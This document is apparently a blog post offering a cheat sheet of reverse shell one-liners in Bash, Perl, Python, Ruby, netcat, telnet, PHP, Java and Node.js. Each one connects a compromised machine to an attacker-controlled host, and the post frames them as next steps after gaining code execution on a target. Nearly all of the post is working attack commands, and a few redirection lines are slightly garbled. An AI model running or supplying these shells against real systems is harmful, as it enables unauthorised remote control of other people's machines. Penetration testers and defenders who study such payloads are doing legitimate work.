---
layout: post
title: Reverse Shell One Liners
---

There might be several occasions where you might have code execution on a target machine and you sit there wondering what to do next.

Well here is what you can do. Setup **netcat** listener on port **4444**. 
```bash
nc -nvlp 4444
```
Bash
```bash
exec /bin/bash 0&0 2>&0

0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

exec 5<>/dev/tcp/attackerip/4444
cat <&5 | while read line; do $line 2>&5 >&5; done  # or:
while read line 0<&5; do $line 2>&5 >&5; done

bash -i >& /dev/tcp/attackerip/4444 0>&1
```
<!-- more -->
Perl
```perl
//Does not depend on /bin/sh
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

//Windows target
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

//Could try this one also. (*nix /bin/sh)
perl -e 'use Socket;$i="attackerip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attackerip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
Ruby
```ruby
//Does not depend on /bin/sh
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

//Windows Target
ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

//*nix /bin/sh
ruby -rsocket -e'f=TCPSocket.open("attackerip",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
Netcat
```bash
nc attackerip 4444 -e /bin/sh
/bin/sh | nc attackerip 4444
rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p
```
Telnet
```bash
rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
Or:
telnet attackerip 4444 | /bin/bash | telnet attackerip 4445
# Setup listener on attcker machine on port 4445/tcp
```
PHP
```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
# This code assumes that the TCP connection uses file descriptor 3. 
# If it doesn’t work, try 4, 5, 6…
```
Java Reverse Shell
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
NodeJS Reverse Shell
```
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(4444, "192.168.1.1", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();
```
